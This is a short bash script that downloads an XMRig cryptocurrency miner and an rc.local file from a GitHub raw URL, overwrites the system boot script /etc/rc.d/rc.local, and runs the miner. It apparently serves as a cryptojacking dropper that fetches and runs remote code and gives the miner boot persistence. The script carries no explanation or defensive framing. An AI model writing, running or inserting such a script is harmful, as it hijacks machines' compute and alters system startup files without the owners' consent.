#!/bin/bash
wget https://raw.githubusercontent.com/zy123456-zhong/mycode/master/xmrig-5.7.0.zip
wget https://raw.githubusercontent.com/zy123456-zhong/mycode/master/rc.local
unzip xmrig-5.7.0.zip
cat /root/rc.local.1 > /etc/rc.d/rc.local 
chmod +x /etc/rc.d/rc.local
chmod +x xmrig-5.7.0/xmrig
./xmrig-5.7.0/xmrig

